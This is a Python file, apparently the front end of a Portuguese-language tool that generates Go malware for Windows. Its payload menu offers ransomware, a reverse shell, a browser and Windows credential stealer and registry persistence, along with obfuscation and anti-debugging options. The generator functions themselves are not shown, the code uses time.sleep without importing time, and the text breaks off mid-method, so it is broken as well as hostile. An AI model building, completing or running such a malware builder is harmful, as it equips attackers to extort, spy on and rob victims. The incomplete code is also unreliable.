#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import base64
import hashlib
from typing import Dict, List, Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.syntax import Syntax

console = Console()

class GoMalwareGenerator:
    def __init__(self):
        self.payloads = {
            'ransomware': {
                'function': self.generate_ransomware,
                'danger_level': 'critical',
                'description': 'Ransomware com criptografia AES-256 + chave RSA'
            },
            'reverse_shell': {
                'function': self.generate_reverse_shell,
                'danger_level': 'high',
                'description': 'Reverse Shell TCP com reconexão automática'
            },
            'credential_stealer': {
                'function': self.generate_credential_stealer,
                'danger_level': 'high',
                'description': 'Rouba credenciais de navegadores e armazenamento Windows'
            },
            'persistence': {
                'function': self.generate_persistence,
                'danger_level': 'medium',
                'description': 'Mecanismo de persistência via Registry Run Keys'
            }
        }

        self.obfuscation_techniques = {
            'polymorphic': 'Código polimórfico',
            'encrypt': 'Seções criptografadas',
            'junk': 'Inserção de código inútil',
            'antidebug': 'Anti-debugging',
            'obfuscate': 'Ofuscação de strings'
        }

        self.banners = [
            self._generate_dark_banner(),
            self._generate_tech_banner(),
            self._generate_hell_banner()
        ]

    def _generate_dark_banner(self) -> str:
        return """
[bold red]
 ██████╗  ██████╗       ███╗   ███╗ █████╗ ██╗     ██╗    ██╗ █████╗ ██████╗ ███████╗
██╔════╝ ██╔═══██╗      ████╗ ████║██╔══██╗██║     ██║    ██║██╔══██╗██╔══██╗██╔════╝
██║  ███╗██║   ██║█████╗██╔████╔██║███████║██║     ██║ █╗ ██║███████║██████╔╝█████╗  
██║   ██║██║   ██║╚════╝██║╚██╔╝██║██╔══██║██║     ██║███╗██║██╔══██║██╔══██╗██╔══╝  
╚██████╔╝╚██████╔╝      ██║ ╚═╝ ██║██║  ██║███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗
 ╚═════╝  ╚═════╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
[/bold red]
[bold white on red]          GERADOR DE MALWARE EM GOLANG PARA WINDOWS - DARK EDITION v3.0[/bold white on red]
"""

    def _generate_tech_banner(self) -> str:
        return """
[bold cyan]
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣶⣶⣶⣾⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠉⠈⠁⠉⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡟
⢸⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⡇
⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠀
⠀⢹⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠇⠀
⠀⠀⢻⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣷⣶⣦⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⠟⡿⣿⣿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⣀⣀⣀⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⡏⠀⠀
⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⡇⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
⠀⠀⠀⠀⢀⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⡇⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⣼⣧⡀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠻⢿⣿⣿⣿⣿⣿⣧⠀⢀⣼⣿⣿⣷⡄⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣧⣀⣿⣿⣿⣿⣧⣰⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣿⠟⠋⠉⠛⠷⠶⠒⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠈⠻⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⢻⣿⣿⣿⣿⠛⢻⣿⣿⡏⠀⢀⣽⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣇⠀⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣿⢰⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣿⢸⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⡿⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⣿⣿⣿⡿⠀⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⣿⣿⣿⡇⠀⣿⣿⣿⠇⢸⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⠀⢻⣿⣿⡇⠀⣿⣿⣿⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠋⠀⠸⣿⣿⠇⠀⢿⣿⠏⠀⠸⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[/bold cyan]
[bold black on cyan]       GERADOR DE PAYLOADS EM GO - TECHLORD EDITION[/bold black on cyan]
"""

    def _generate_hell_banner(self) -> str:
        return """
[bold yellow]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣷⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⢟⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣠⣾⢿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⢁⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢘⣿⣿⣿⣿⣿⣿⣿⣿⠀⢡⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢈⣿⣿⣿⣿⣿⣿⣿⣿⠀⣎⠆⠀⠀
⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⡰⠇⠀⠀
⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡳⠁⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣸⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣯⢳⠁⠀⠀
⡐⠁⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⣸⣿⣿⣿⣿⣿⣿⣧⡙⣿⣿⣿⣇⠃⠀⠀
⠙⠲⢦⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠻⠟⠫⠩⠍⠀⣰⠾⢹⣿⣿⣛⣛⣻⣿⣿⣌⠻⣷⣏⠆⠀⠀
⠀⠐⡈⣯⢴⠾⣄⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⡀⢀⣠⣤⣦⣴⣤⡀⣠⣼⣦⠟⣠⡾⠟⠋⢉⠉⠉⠉⠉⠁⣘⢻⡇⠀⠀
⠀⠀⢡⣷⢸⣿⣿⣂⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡿⣋⡅⠂⢸⣷⠀⡀⠀⠀⠀⠐⢻⣿⣿⣌⠆
⠀⠀⢀⣿⢸⣿⣿⣿⣷⣦⡻⣿⣿⣿⣿⡿⠻⣿⣿⣿⠿⠋⢠⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⣫⣶⣟⣿⣿⠢⠋⠀⠀⣿⡏⢠⣀⠒⢶⠀⣄⢂⠉⠙⠉⠀
⠀⠀⢸⣽⡇⢿⣿⣿⣿⣿⣷⣄⠉⢁⢠⣷⣤⣄⡈⣁⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⡾⣿⡿⠟⣋⠉⠀⠀⠀⠀⢰⣾⡏⢰⢈⣿⣿⠀⢹⣾⢀⠀⠀⠀
⠀⣴⣿⣿⣷⣶⣮⣭⣟⣛⣛⡂⡼⠦⣾⣿⣻⣿⣿⣿⣳⣜⣛⣻⣭⣷⣾⣿⡿⣿⠽⠟⠁⣠⣶⣷⣆⠀⠀⠀⠀⢸⣿⡇⢸⣿⣿⣿⠀⠈⠣⠘⠀⠀⠀
⠚⢿⣿⣟⣿⣿⡈⠻⠍⢿⣿⡇⠄⠀⠈⢻⣿⣿⣻⣿⣿⣭⣿⡭⠉⠁⠄⠈⠁⠀⢀⢠⣇⠛⠉⠋⠀⠀⠀⠀⠀⢸⣿⠇⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠋⠁⠀⠈⠁⠀⢨⣿⡿⠀⡴⢰⢡⣿⣿⣿⣿⣿⣿⣿⢃⠖⡀⠔⢠⢊⢠⣼⠾⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣽⡿⠃⣄⠶⠁⣰⣿⣿⣿⣿⢻⣿⡏⣰⠠⣽⣆⢹⣿⠘⣿⡇⡿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⠀⣴⣿⣦⢰⣿⣿⣿⣿⣿⢸⣿⡇⣿⠀⣾⣿⡈⢿⣷⠹⡛⠁⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⢸⣿⣧⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⢧⡟⣷⡾⣿⣿⣆⣿⣿⣿⢹⣿⣧⢸⣿⢀⣿⠇⠛⣭⡄⢤⣤⠰⣿⠀⠀⠀⠀⠀⠀⠀⠀⣰⣾⡇⢸⣿⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⢧⡿⣾⣿⢱⣿⣇⠿⢿⡻⠟⠻⣛⠁⣈⣥⢠⣾⣶⡹⣿⣿⡜⣿⣧⠻⠃⠀⠀⠀⠀⠀⢀⣰⣿⣿⠁⣾⣿⢡⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡶⣶⣰⣦⢆⣴⡐⣴⣶⢶⣾⡇⢹⣿⢃⣻⣿⡘⣿⣧⡇⠻⠟⠃⢉⡄⠀⠂⣀⣀⣀⡤⠔⣫⣿⣿⠃⣸⡿⣿⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣾⣼⣿⣿⢇⡞⣧⣽⣿⢟⣼⣿⢣⣿⣿⠄⢿⠟⢃⡍⣩⡴⠀⣘⡋⣀⠄⣀⣴⣭⣿⣿⣿⣿⡿⠟⢁⣼⡟⢠⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠟⡋⠿⠟⠸⠿⣉⣙⡛⡸⣿⠋⢀⣭⣬⡔⢠⣿⡏⢀⡿⠀⢠⣽⡀⣶⣾⠘⣿⣏⣠⣶⣛⣷⣶⣶⣿⣿⣷⣿⣿⣿⣿⣿⣟⣷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡇⣿⣿⣸⣿⡿⣿⣇⡁⣿⣷⠎⢿⡿⠁⡈⠏⣀⢸⣶⣶⢸⣿⠇⣿⣷⣾⣉⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣁⢛⣁⣈⣛⣂⣌⣉⣤⣤⣥⠶⣶⣶⡔⢿⣿⡿⠸⣿⣏⠸⣿⣶⢹⣿⣿⣿⣿⣿⣟⡻⠾⠿⠿⠿⠿⣭⣜⣛⣻⣿⡾⠛⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠹⡇⣾⡟⢿⣿⡿⢿⣿⣿⢿⣿⡧⣟⣽⠃⡘⣿⣧⠂⣿⣿⣜⣿⣷⣬⣿⣿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠉⠐⠒⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣤⢨⣀⡈⡏⣁⡀⣿⢹⣟⣿⠇⣬⣹⣆⢷⣿⣿⣆⠻⣿⣿⣿⡿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣶⣟⣼⣿⣸⣷⣿⣇⣿⣾⣿⣿⣧⣸⣿⣿⣮⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⠾⠷⠿⠿⠿⢿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[/bold yellow]
[bold black on yellow]       GERADOR DE MALWARE GO - HELLFIRE EDITION[/bold black on yellow]
"""

    def show_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL PODE RESULTAR EM PRISÃO! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)

    def show_main_menu(self):
        while True:
            console.clear()
            self.show_banner()

            table = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL (GOLANG WINDOWS)[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("Opção", style="cyan", width=10)
            table.add_column("Payload", style="green")
            table.add_column("Perigo", style="red")
            table.add_column("Descrição")

            for i, (name, data) in enumerate(self.payloads.items(), 1):
                danger = {
                    'critical': '💀 CRÍTICO',
                    'high': '🔥 ALTO',
                    'medium': '⚠️ MÉDIO'
                }.get(data['danger_level'], '')
                table.add_row(
                    str(i),
                    name,
                    danger,
                    data['description']
                )

